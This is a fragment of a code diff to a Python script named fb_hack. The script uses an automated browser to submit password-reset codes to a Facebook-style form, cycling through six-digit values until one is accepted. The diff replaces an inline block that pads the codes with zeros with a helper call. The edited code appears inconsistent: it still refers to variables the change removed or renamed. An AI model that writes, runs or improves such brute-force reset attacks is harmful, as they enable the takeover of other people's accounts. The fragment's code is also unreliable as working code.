@@ -95,8 +95,8 @@ def fb_hack():
   browser.submit()
   """reset code input"""
   browser.select_form(nr=0)
-  reset = 999999
-  browser.form['n'] = str(reset)
+  pass1 = 999999
+  browser.form['n'] = str(pass1)
   browser.submit()
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
@@ -115,35 +115,10 @@ def fb_hack():
   if check1 != test:
     while check1 != test or reset > 99999:  
       browser.select_form(nr=0)
-      y = reset
-      if reset < 100000:
-        h = ""
-        code = ("0", str(y))
-        yo = h.join(code)
-      elif reset < 10000:
-        h = ""
-        code = ("0000", str(y))
-        yo = h.join(code)
-      elif reset < 1000:
-        h = ""
-        code = ("00000", str(y))
-        yo = h.join(code)
-      elif reset < 100:
-        h = ""
-        code = ("000000", str(y))
-        yo = h.join(code)
-      elif reset < 10:
-        h = ""
-        code = ("00000000", str(y))
-        yo = h.join(code)
-      elif reset < 0:
-        reset = 999999
-        yo = str(reset)
-      else:
-        yo = str(reset)
-      browser.form['n'] = yo
+      y = passcode(reset)
+      browser.form['n'] = y
       browser.submit()
-      print(yo, end='\r')
+      print(y, end='\r')
       fail = (yo, "failed")
       success = (yo, "succeded")
       s = " "
